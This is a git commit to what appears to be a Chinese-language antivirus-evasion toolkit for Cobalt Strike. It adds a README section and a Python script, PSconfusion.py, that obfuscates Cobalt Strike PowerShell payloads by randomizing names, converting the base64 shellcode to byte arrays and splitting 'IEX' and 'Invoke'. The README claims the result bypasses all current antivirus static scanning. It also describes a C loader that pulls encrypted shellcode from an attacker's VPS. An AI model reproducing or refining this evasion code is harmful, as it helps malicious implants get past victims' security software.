5c0217df4c98e66c54d1679f9db74b57e0c4df58
Gality369 <gality369@gmail.com>
2020-08-30 23:53:44 +0800

    V1.7加入Powershell版本

--- README.md
+++ README.md
@@ -7,6 +7,8 @@ V1.0: 目前测试可以过Defender/火绒的静杀+动杀,360还没测= =不想
 
 V1.5: 加入C版本CS免杀
 
+V1.7:加入Powershell的免杀
+
 V2.0: 开发出UI界面
 
 V3.0: 想办法结合更多免杀技术(想去研究下进程注入/文件捆绑,不知道免杀效果怎样)
@@ -19,7 +21,9 @@ python:
 - pyinstaller
 - requests
 
-C VS2019默认就够了
+C: VS2019默认就够了
+
+Powershell: Win10上测试没有问题,也就是ps5.1,更低版本未测试
 
 ## 安装
 
@@ -43,6 +47,12 @@ C VS2019默认就够了
    > 2. 将第一行的数字复制进Loader的Base64ShellLen字段中,将第二行生产的加密shellcode保存在payload.txt文件中并将其放在服务器上(如果不叫这名或者不在跟路径,需要自己改`char request[1024] = "GET /RC4Payload32.txt HTTP/1.1\r\nHost:";`中的路径)
    > 3. 在Loader中填入自己的Key和VPS的IP,编译
    > 4. 执行编译出的exe,CS上线
+   
+4. Powershell版本:
+
+   > 1. 在CS中生成Powershell版本的payload.ps1
+   > 2. Python3 PSconfusion.py payload.ps1 AVpayload.ps1
+   > 3. 经测试能过目前所有杀软的静杀,动杀的话,由于CS中有些模块不免杀,所以加载这些模块时可能会触发动杀,这个以后再研究怎么绕过
 
 ## 注意
 
@@ -59,3 +69,5 @@ C VS2019默认就够了
 3. 经过测试,C版本在X86Debug模式编译下无任何问题,Release模式下会存在莫名bug,在某些电脑上无法正常上线,请根据需求自行测试
 
 4. 编译选项不要选择动态编译,否则可能会因为目标靶机上缺少相应dll而无法运行.
+
+5. 加载ps脚本的方式这里不做讨论,有师傅已经总结的非常好了,请自行百度
---
+++ powershell版本/PSconfusion.py
@@ -0,0 +1,53 @@
+
+
+import random
+import sys
+import re
+import base64
+
+def randomName():
+    str = ""
+    for lenth in range(random.randint(1, 5)):
+        str += random.choice('abcdefghijklmnopqrstuvwxyzQWERTYUIOPASDFGHJKLZXCVBNM')
+    return str
+
+def confusion(payload):
+    AVpayload = payload
+    shellcode = '[Byte[]]('
+
+    VarFuncNamePattern = r'function [\w_]+'
+    VarBase64Pattern = r"FromBase64String\('.+'\)"
+    VarPattern = r"\$[\w_]{2,}"
+
+    VarFuncName = re.findall(VarFuncNamePattern, payload)
+    VarBase64 = re.findall(VarBase64Pattern, payload)[0]
+    Vars = list(set(re.findall(VarPattern, payload)))
+    Vars.remove('$True')
+    Vars.remove('$false')
+    Vars.remove('$null')
+
+    # 随机混淆
+    for Name in VarFuncName:
+        AVpayload = re.sub(Name[9:], randomName(), AVpayload)
+    for Var in Vars:
+        AVpayload = re.sub(Var[1:], randomName(), AVpayload)
+    for i in base64.b64decode(VarBase64[18:-2]):
+        shellcode += str(i) + ','
+    shellcode = shellcode[:-1] + ')'
+    AVpayload = re.sub(VarBase64, shellcode, AVpayload)
+    AVpayload = re.sub(r"'Invoke'", r"'Invo'+'ke'", AVpayload)
+    AVpayload = re.sub(r"IEX", r"I`eX", AVpayload)
+
+    return AVpayload
+
+
+if __name__ == "__main__":
+    try:
+        f = open(sys.argv[1],'r')
+        p = open(sys.argv[2],'w')
+    except:
+        print("Usage: python3 PSconfusion.py RawCSpayload.ps1 ConfusionPayload.ps1")
+    payload = f.read()
+    p.write(confusion(payload))
+    f.close()
+    p.close()
